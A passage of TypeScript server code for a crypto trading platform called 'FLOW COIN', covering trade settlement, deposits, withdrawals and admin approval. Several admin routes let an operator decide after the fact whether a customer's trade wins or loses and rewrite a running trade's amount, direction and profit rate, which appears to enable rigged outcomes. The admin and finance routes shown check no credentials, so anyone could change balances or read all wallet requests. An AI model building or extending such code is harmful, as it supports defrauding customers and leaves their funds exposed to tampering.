    user.freezeBalance = Math.max(0, +(user.freezeBalance - marginNative).toFixed(2));

    if (isWin) {
      trade.outcome = 'WIN';
      const profitNative = +(marginNative * (trade.profitPercent / 100)).toFixed(2);
      const payoutNative = +(marginNative + profitNative).toFixed(2);
      trade.payoutNative = payoutNative;
      trade.payoutUsd = +(payoutNative / rate).toFixed(2);
      user.balance = +(user.balance + payoutNative).toFixed(2);
    } else {
      trade.outcome = 'LOSS';
      trade.payoutUsd = 0;
      trade.payoutNative = 0;
      // Margin lost, already deducted from balance upon trade entry
    }

    saveDatabase();
    res.json({ success: true, trade, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // Admin Manual Settle / Adjust
  app.post('/api/trades/:id/admin-adjust', (req: Request, res: Response) => {
    const { outcome } = req.body; // 'WIN' or 'LOSS'
    const trade = db.trades.find(t => t.id === req.params.id);
    if (!trade) return res.status(404).json({ error: 'Trade not found' });

    const user = db.users.find(u => u.id === trade.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const prevOutcome = trade.outcome;
    const isWin = outcome === 'WIN';

    const wasRunning = trade.status === 'RUNNING';

    // If was running, release frozen
    if (wasRunning) {
      user.freezeBalance = Math.max(0, +(user.freezeBalance - trade.marginUsd).toFixed(2));
    } else if (trade.status === 'SETTLED') {
      // Revert previous payout if changing from WIN to LOSS
      if (prevOutcome === 'WIN' && !isWin) {
        user.balance = Math.max(0, +(user.balance - trade.payoutUsd).toFixed(2));
      } else if (prevOutcome === 'LOSS' && isWin) {
        // Add win payout
        const payout = +(trade.marginUsd * (1 + trade.profitPercent / 100)).toFixed(2);
        user.balance = +(user.balance + payout).toFixed(2);
      }
    }

    trade.status = 'SETTLED';
    trade.outcome = isWin ? 'WIN' : 'LOSS';
    trade.payoutUsd = isWin ? +(trade.marginUsd * (1 + trade.profitPercent / 100)).toFixed(2) : 0;
    trade.settledAt = new Date().toISOString();

    if (wasRunning && isWin) {
      user.balance = +(user.balance + trade.payoutUsd).toFixed(2);
    }

    saveDatabase();
    res.json({ success: true, trade, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // Admin Update Active Running Trade (Margin Amount, Profit %, Direction)
  app.post('/api/admin/trades/:id/update-active', (req: Request, res: Response) => {
    const { marginUsd, profitPercent, direction, durationSeconds } = req.body;
    const trade = db.trades.find(t => t.id === req.params.id);
    if (!trade) return res.status(404).json({ error: 'Trade not found' });
    const user = db.users.find(u => u.id === trade.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (marginUsd !== undefined && marginUsd > 0) {
      const diff = marginUsd - trade.marginUsd;
      if (diff > 0) {
        if (user.balance < diff) {
          return res.status(400).json({ error: 'User available balance too low to increase trade margin' });
        }
        user.balance = +(user.balance - diff).toFixed(2);
        user.freezeBalance = +(user.freezeBalance + diff).toFixed(2);
      } else if (diff < 0) {
        const release = Math.abs(diff);
        user.freezeBalance = Math.max(0, +(user.freezeBalance - release).toFixed(2));
        user.balance = +(user.balance + release).toFixed(2);
      }
      trade.marginUsd = marginUsd;
      const rate = CURRENCIES[user.nativeCurrency]?.rate || 1.0;
      trade.marginNative = +(marginUsd * rate).toFixed(2);
    }

    if (profitPercent !== undefined) trade.profitPercent = profitPercent;
    if (direction) trade.direction = direction;
    if (durationSeconds) {
      trade.durationSeconds = durationSeconds;
      if (trade.startTime) trade.endTime = trade.startTime + durationSeconds * 1000;
    }

    saveDatabase();
    res.json({ success: true, trade, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // 9. Wallet & Finance Management (Deposits & Withdrawals)
  app.get('/api/finance/requests', (req: Request, res: Response) => {
    const { userId, adminId } = req.query;

    if (userId) {
      return res.json(db.walletRequests.filter(w => w.userId === userId));
    }

    if (adminId) {
      const admin = db.adminAccounts.find(a => a.id === adminId);
      if (!admin) return res.status(401).json({ error: 'Unauthorized' });

      if (admin.role === 'SUPREME_OWNER' || admin.role === 'SUPER_ADMIN') {
        return res.json(db.walletRequests);
      }

      // Sub-admin: only requests of their registered users
      const subAdminUserIds = new Set(
        db.users.filter(u => u.referralCodeUsed === admin.referralCode || u.referredByAdminId === admin.id).map(u => u.id)
      );
      return res.json(db.walletRequests.filter(w => subAdminUserIds.has(w.userId)));
    }

    res.json(db.walletRequests);
  });

  // Client Deposit Request
  app.post('/api/finance/deposit', (req: Request, res: Response) => {
    const { userId, amountNative, network, addressOrAccount, txHash } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const numNative = parseFloat(amountNative);
    if (isNaN(numNative) || numNative <= 0) {
      return res.status(400).json({ error: 'Invalid deposit amount' });
    }

    const rate = CURRENCIES[user.nativeCurrency]?.rate || 1.0;
    const amountUsd = +(numNative / rate).toFixed(2);

    if (amountUsd < db.currentAppConfig.minDepositUsd) {
      return res.status(400).json({
        error: `Minimum deposit amount is $${db.currentAppConfig.minDepositUsd} USD equivalent`
      });
    }

    const newRequest: WalletRequest = {
      id: `wlt_dep_${Date.now()}`,
      userId: user.id,
      username: user.username,
      type: 'DEPOSIT',
      amountUsd,
      amountNative: numNative,
      currency: user.nativeCurrency,
      network: network || 'USDT (TRC20)',
      addressOrAccount: addressOrAccount || 'Client Wallet / Bank',
      txHash: txHash || `tx_${Math.random().toString(36).substr(2, 9)}`,
      status: 'PENDING',
      remarks: 'Deposit submitted, waiting for on-chain or gateway confirmation',
      createdAt: new Date().toISOString()
    };

    db.walletRequests.unshift(newRequest);
    saveDatabase();
    res.json({ success: true, request: newRequest });
  });

  // Client Withdrawal Request (Instant Balance Freezing)
  app.post('/api/finance/withdraw', (req: Request, res: Response) => {
    const { userId, amountNative, network, addressOrAccount } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (user.status !== 'Active') {
      return res.status(403).json({ error: 'Account is restricted from withdrawals' });
    }

    const numNative = parseFloat(amountNative);
    if (isNaN(numNative) || numNative <= 0) {
      return res.status(400).json({ error: 'Invalid withdrawal amount' });
    }

    const rate = CURRENCIES[user.nativeCurrency]?.rate || 1.0;
    const amountUsd = +(numNative / rate).toFixed(2);

    if (amountUsd < db.currentAppConfig.minWithdrawalUsd) {
      return res.status(400).json({
        error: `Minimum withdrawal amount is $${db.currentAppConfig.minWithdrawalUsd} USD equivalent`
      });
    }

    if (user.balance < amountUsd) {
      return res.status(400).json({ error: 'Insufficient available balance' });
    }

    // Freeze balance immediately during PENDING status
    user.balance = +(user.balance - amountUsd).toFixed(2);
    user.freezeBalance = +(user.freezeBalance + amountUsd).toFixed(2);

    const newRequest: WalletRequest = {
      id: `wlt_with_${Date.now()}`,
      userId: user.id,
      username: user.username,
      type: 'WITHDRAWAL',
      amountUsd,
      amountNative: numNative,
      currency: user.nativeCurrency,
      network: network || 'USDT (TRC20)',
      addressOrAccount: addressOrAccount || '',
      status: 'PENDING',
      remarks: 'Pending security review & processing',
      createdAt: new Date().toISOString()
    };

    db.walletRequests.unshift(newRequest);
    saveDatabase();

    res.json({ success: true, request: newRequest, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // Admin Approve / Reject Request
  app.post('/api/finance/requests/:id/action', (req: Request, res: Response) => {
    const { action, remarks } = req.body; // 'APPROVE' or 'REJECT'
    const request = db.walletRequests.find(w => w.id === req.params.id);
    if (!request) return res.status(404).json({ error: 'Request not found' });

    if (request.status !== 'PENDING') {
      return res.status(400).json({ error: 'Request already processed' });
    }

    const user = db.users.find(u => u.id === request.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (action === 'APPROVE') {
      request.status = 'APPROVED';
      request.remarks = remarks || 'Approved by Administrator';
      request.processedAt = new Date().toISOString();

      if (request.type === 'DEPOSIT') {
        // Credit funds to user balance
        user.balance = +(user.balance + request.amountUsd).toFixed(2);
      } else if (request.type === 'WITHDRAWAL') {
        // Funds were frozen when requested; remove from frozen escrow
        user.freezeBalance = Math.max(0, +(user.freezeBalance - request.amountUsd).toFixed(2));
      }
    } else if (action === 'REJECT') {
      request.status = 'REJECTED';
      request.remarks = remarks || 'Rejected by Administrator';
      request.processedAt = new Date().toISOString();

      if (request.type === 'WITHDRAWAL') {
        // Refund frozen balance back to available balance!
        user.freezeBalance = Math.max(0, +(user.freezeBalance - request.amountUsd).toFixed(2));
        user.balance = +(user.balance + request.amountUsd).toFixed(2);
      }
    }

    saveDatabase();
    res.json({ success: true, request, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // -------------------------------------------------------------
  // VITE DEV SERVER OR STATIC DIST
  // -------------------------------------------------------------
  const isProd = process.env.NODE_ENV === 'production';
  if (!isProd) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req: Request, res: Response) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 FLOW COIN Full-Stack Server running on port ${PORT}`);
  });
}

startServer();
